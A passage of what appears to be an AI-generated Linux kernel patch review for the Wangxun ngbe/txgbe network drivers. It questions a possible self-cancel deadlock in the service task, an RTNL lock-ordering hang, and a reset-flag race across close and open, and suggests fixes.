+  ngbe_reinit_locked():
+      ngbe_down(wx);
+      ngbe_up(wx);
+
+  ngbe_down() -> ngbe_disable_device():
+      ...
+      cancel_work_sync(&wx->service_task);
+
+So the running service_task ends up calling cancel_work_sync() on
+itself. cancel_work_sync() inserts a barrier behind the currently
+executing work and waits for completion; the barrier cannot run until
+the current work returns, and the current work cannot return until the
+barrier completes. Would the worker hang on the very first Tx timeout?
+
+There is also an rtnl ordering question. wx_reset_subtask() takes
+rtnl_lock() before calling do_reset, while ngbe_close() runs under
+RTNL and calls ngbe_disable_device() (and therefore cancel_work_sync())
+with RTNL still held. If the service task is already blocked on
+rtnl_lock() in wx_reset_subtask() while close holds RTNL and waits for
+the work to finish, can the two paths deadlock on each other?
+
+The same hazard is reachable via ngbe_dev_shutdown(), which wraps
+ngbe_close() in rtnl_lock()/rtnl_unlock().
+
+Note that txgbe_disable_device() does not call cancel_work_sync(), so
+adding it there for symmetry would import the same self-cancel
+deadlock; the fix likely belongs elsewhere (for example, having
+wx_reset_subtask() schedule the reset outside of the worker, or using
+a separate work item for the reset).
+
+> +static void wx_watchdog_flush_tx(struct wx *wx)
+> +{
+> +	if (netif_carrier_ok(wx->netdev))
+> +		return;
+> +
+> +	if (wx_ring_tx_pending(wx) || wx_vf_tx_pending(wx)) {
+> +		/* We've lost link, so the controller stops DMA,
+> +		 * but we've got queued Tx work that's never going
+> +		 * to get done, so reset controller to flush Tx.
+> +		 * (Do the reset outside of interrupt context).
+> +		 */
+> +		wx_warn(wx, "initiating reset due to lost link with pending Tx work\n");
+> +		set_bit(WX_FLAG_NEED_PF_RESET, wx->flags);
+> +	}
+> +}
+
+[Medium]
+On txgbe, can WX_FLAG_NEED_PF_RESET survive across a close and trigger
+a spurious reset on the next open?
+
+txgbe_disable_device() clears the flag and then calls
+timer_delete_sync() but, unlike ngbe_disable_device(), does not call
+cancel_work_sync(&wx->service_task):
+
+  clear_bit(WX_FLAG_NEED_PF_RESET, wx->flags);
+  timer_delete_sync(&wx->service_timer);
+
+timer_delete_sync() only stops future timer fires; an already-queued
+or in-flight service_task still runs. wx_watchdog_flush_tx() sets
+WX_FLAG_NEED_PF_RESET based only on netif_carrier_ok() and
+ntu != ntc, without consulting netif_running(). After phylink_stop()
+drops carrier and before wx_clean_all_tx_rings() resets ntu/ntc, an
+in-flight service_task can re-set the flag after the close path has
+cleared it.
+
+On the next open, txgbe_up_complete() does
+mod_timer(&wx->service_timer, jiffies); the service_task fires, sees
+WX_FLAG_NEED_PF_RESET still set, and wx_reset_subtask() runs
+txgbe_do_reset() against the just-opened device.
+
+Would gating wx_watchdog_flush_tx() on netif_running(wx->netdev), or
+clearing the flag in the open path, address this?
+
+> diff --git a/drivers/net/ethernet/wangxun/txgbe/txgbe_main.c b/drivers/net/ethernet/wangxun/txgbe/txgbe_main.c
+> index 8b7c3753bb6a..ba55a17da3b8 100644
+> --- a/drivers/net/ethernet/wangxun/txgbe/txgbe_main.c
+> +++ b/drivers/net/ethernet/wangxun/txgbe/txgbe_main.c
+> @@ -228,6 +231,7 @@ static void txgbe_disable_device(struct wx *wx)
+>  	wx_irq_disable(wx);
+>  	wx_napi_disable_all(wx);
+>  
+> +	clear_bit(WX_FLAG_NEED_PF_RESET, wx->flags);
+>  	timer_delete_sync(&wx->service_timer);
+>  
+>  	if (wx->bus.func < 2)
+-- 
+This is an AI-generated review.
 
 
